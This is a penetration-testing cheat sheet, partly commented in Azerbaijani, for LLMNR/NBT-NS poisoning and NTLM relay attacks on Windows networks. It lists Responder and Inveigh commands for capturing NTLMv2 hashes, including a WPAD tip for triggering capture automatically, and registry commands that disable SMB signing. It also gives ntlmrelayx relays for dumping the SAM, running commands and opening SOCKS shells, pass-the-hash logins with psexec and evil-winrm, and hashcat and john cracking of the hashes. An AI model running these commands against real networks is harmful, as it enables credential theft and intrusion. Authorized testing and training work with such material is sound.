# LLMNR (Link-Local Multicast Name Resolution) #UDP 5355 / NBT-NS ( NetBIOS Name Service ) #UDP 137

## Enumeration
```
NMAP
nmap -sU --script nbstat.nse -p137 <target-ip-range>

RESPONDER
sudo responder -I eth0 -A ( Analyze Mode )
sudo responder -I eth0 -dwv

/usr/share/responder/logs/
grep -i "NTLM" /usr/share/responder/logs/Responder-Session.log | awk -F'::' '{print $1}' | awk '{print $NF}' | sort -u

WIRESHARK
llmnr || nbns
udp.port == 5355 (LLMNR)
udp.port == 137 (NetBIOS Name Service)
```

## SMB-Signing Enumeration
```
nmap -p 445 --script smb2-security-mode 192.168.0.0/24

crackmapexec smb 192.168.0.0/24
nxc smb 192.168.0.0/24


## SMB-Signing disabled:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "requiresecuritysignature" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "enablesecuritysignature" -Value 0

CMD: net stop lanmanserver && net start lanmanserver

```

## Responder
```powershell
Target Triggering:
\\<RESPONDER-IP>\Shared
Triggering: Qurbanın özünün səhv yazmasını gözləmək istəmirsənsə, WPAD (Web Proxy Auto-Discovery) hücumunu da Responder-də aktiv saxla (-w parametri ilə). Bu, brauzer açılan kimi avtomatik sorğu yarada bilər.

## Responder 
sudo responder -I eth0 -rdwv -F
tail -f /usr/share/responder/logs/SMB-NTLMv2-*.txt
```

## Inveigh
```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -FileUpload L -IP <SPECIAL-IP> -Unique

Invoke-InveighRelay -Target 172.16.0.50 -Command "whoami /all" -ConsoleOutput Y
```

## NTLMRELAYX
```powershell
Terminal 1: 192.168.1.40 dan gələn NTLM Hash ilə 192.168.1.50 hostuna NTLM Relay edir ( Self-Relay mümkün deyil )
/etc/responder/Responder.conf --> SMB = Off / HTTP = Off

python3 ntlmrelayx.py -t 192.168.1.50 -smb2support ( SAM DUMP )
impacket-psexec -hashes :NTHash administrator@192.168.1.50
evil-winrm -i 192.168.1.50 -u administrator -H NTHash

python3 ntlmrelayx.py -t 192.168.1.50 -smb2support -c "whoami /all" ( EXECUTE COMMAND )

nxc smb 192.168.0.0/24 --gen-relay-list targets.txt
impacket-ntlmrelayx -tf targets.txt -smb2support


### Proxychains vasitəsilə daxil olmaq:
python3 ntlmrelayx.py -t 192.168.1.50 -smb2support -socks ( INTERACTIVE SHELL )
proxychains smbclient //target-ip/C$ -U domain/user

Terminal 2:
sudo responder -I eth0 -dwv -F
```

# Hash Cracking
```
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
# və ya
john --wordlist=rockyou.txt --format=netntlmv2 captured.hash
```






